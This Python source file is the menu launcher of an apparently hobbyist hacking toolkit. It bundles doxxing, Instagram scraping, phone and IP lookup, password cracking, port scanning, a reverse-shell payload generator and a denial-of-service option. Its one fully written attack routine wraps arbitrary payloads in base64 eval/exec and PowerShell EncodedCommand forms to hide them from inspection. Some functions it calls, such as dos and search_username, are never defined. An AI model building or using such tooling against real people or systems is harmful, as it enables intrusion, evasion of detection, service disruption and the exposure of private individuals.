import os
import instaloader
from tools.ip_lookup import run_menu
from tools import IGscrape, phonelookup, rev
from tools.passcrack import passcrack
from tools.passhasher import passhasher
from tools.ip_grabber import ipgrabber
from tools import ip_lookup
from tools.angryipscanner import run_scan
from tools.doxx import create_osint_profile
from tools.dork import dork
from tools.dirbuster import dirbuster
from tools.usersearch import main
from tools.phonelookup import LookUp
from tools.nmapscan import nmapscan
from tools.rev import generate
from instaloader.exceptions import QueryReturnedBadRequestException
from tools.snake import start_game
from tools.internetsearch import start_search
from tools.darkweb import darkweb
import base64

PURPLE = "\033[35m"
RESET = "\033[0m"

def obfuscate_payload():
    lang = input("\033[36mEnter language (bash/python/php/nc/powershell): \033[0m").strip().lower()
    payload = input("\033[36mEnter your payload: \033[0m").strip()

    def obfuscate(p, l):
        if l == "bash":
            return f"eval $(echo {base64.b64encode(p.encode()).decode()} | base64 -d)"
        elif l == "python":
            encoded = base64.b64encode(p.encode()).decode()
            return f"import base64; exec(base64.b64decode('{encoded}'))"
        elif l == "php":
            encoded = base64.b64encode(p.encode()).decode()
            return f"<?php eval(base64_decode('{encoded}')); ?>"
        elif l == "nc":
            return f"# Original: {p}\n# Netcat doesn't obfuscate well. Wrap in a script instead."
        elif l == "powershell":
            encoded = base64.b64encode(p.encode('utf-16le')).decode()
            return f"powershell -EncodedCommand {encoded}"
        else:
            return "[ERROR] Unsupported language."

    result = obfuscate(payload, lang)
    print(f"\n\033[32m[+] Obfuscated Payload:\033[0m\n{result}")

def insta_scrape():
    target = input("\033[36mEnter the Instagram username to scrape (e.g., 'username'):\033[0m ").strip()
    if target:
        IGscrape.IGScrape(target)
    else:
        print("\033[31m[ERROR]\033[0m No username provided!")

def run_username_search():
    username = input("\033[36mEnter the username to search:\033[0m ").strip()
    found, not_found = search_username(username)

    print("\n\033[32m[+] Found on:\033[0m")
    for site, url in found:
        print(f" - {site}: {url}")

    print("\n\033[31m[-] Not found on:\033[0m")
    for site in not_found:
        print(f" - {site}")

tools = {
    "1": ("IP Lookup", lambda: run_menu()),
    "2": ("InstaScrape", lambda: insta_scrape()),
    "3": ("Phone Lookup", lambda: phonelookup.LookUp(input("\033[36mEnter phone number (With Country Code): \033[0m "))),
    "4": ("Username Search", main),
    "5": ("Search Dorks", lambda: dork()),
    "12": ("DOXX Creator", lambda: create_osint_profile()),
    "9": ("Obfuscate", obfuscate_payload),
    "10": ("Reverse Shell", lambda: reverse_shell()),
    "90": ("Snake Game", lambda: start_game()),
    "91": ("Flappy Bird", lambda: os.system("python3 tools/flappy.py")),
    "13": ("AngryIPScanner", lambda: run_scan()),
    "6": ("DuckDuckGo Search Links", start_search),
    "14": ("IP Grabber", lambda: ipgrabber().start()),
    "15": ("Pass-Cracker", lambda: passcrack()),
    "16": ("Pass-Hasher", lambda: passhasher()),
    "7": ("DarkWeb Links", lambda: darkweb()),
    "21": ("DirBuster", lambda: dirbuster()),
    "22": ("Nmap Scan", lambda: nmapscan()),
    "11": ("Denial Of Service", lambda: dos()),
}

def reverse_shell():
    ip = input("Enter IP: ")
    port = input("Enter Port: ")
    lang = input("Enter language (bash/python/php/nc/powershell): ")
    try:
        payload = generate(ip, port, lang)
        print(f"\nPayload:\n{payload}")
    except ValueError as e:
        print(f"\033[31m[ERROR]\033[0m {e}")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def menu():
    menu = f"""\033[35m
 ______                 __ __            __
/_  __/______ ________ / // /__ __    __/ /__
 / / / __/ _ `/ __/ -_) _  / _ `/ |/|/ /  '_/
/_/ /_/  \_,_/\__/\__/_//_/\_,_/|__,__/_/\_\ 
                                              Created by dankoreo69
                Support on YouTube: https://youtube.com/@dankoreo69
                Support on github:  https://github.com/dankoreo69
 ┌──────────────┐  ┌──────────────────┐   ┌────────────┐   ┌────────────┐
 │    OSINT     ├──┤ OFFENSIVE TOOLS  ├───┤   WEBSITE  ├───┤  T.GAMES   │
 └──────────────┘  └──────────────────┘   └────────────┘   └────────────┘
 (01) IPlookup      (09) Obfuscate         (21) DirBuster   (90) Snake
 (02) InstaScrape   (10) Rev Shell Payload (22) Nmap Scan   (91) Flappy Bird
 (03) Phone Lookup  (11) Denial Of Service (23)             (92)
 (04) UserSearch    (12) DOXX Creator      (24)             (93)
 (05) Search Dorks  (13) AngryIPScanner    (25)             (94)
 (06) Internet Surf (14) IP-Grabber        (26)             (95)
 (07) DarkWeb Links (15) Pass-Cracker      (27)             (96)
 (08)               (16) Pass-Hasher       (28)             (97)

\033[0m"""
    print(menu)

def main():
    clear()
    while True:
        menu()
        choice = input("\033[32mEnter your choice (0 to exit): \033[0m").strip()
        if choice == "0":
            print("\033[33m[!] Goodbye!\033[0m")
            print("\033[34mCreated by dankoreo69\033[0m")
            print("\033[34mSupport on YouTube: https://youtube.com/@dankoreo69?si=YqcM1PeIRUJRSg_H\033[0m")
            break
        elif choice in tools:
            try:
                tools[choice][1]()
            except ValueError as e:
                print(f"\033[31m[ERROR]\033[0m Invalid value: {e}")
            except Exception as e:
                print(f"\033[31m[ERROR]\033[0m Unexpected error: {e}")

            input(f"\n{PURPLE}Press Enter to return to the menu...{RESET}")
            clear()
        else:
            clear()
            continue

if __name__ == "__main__":
    main()

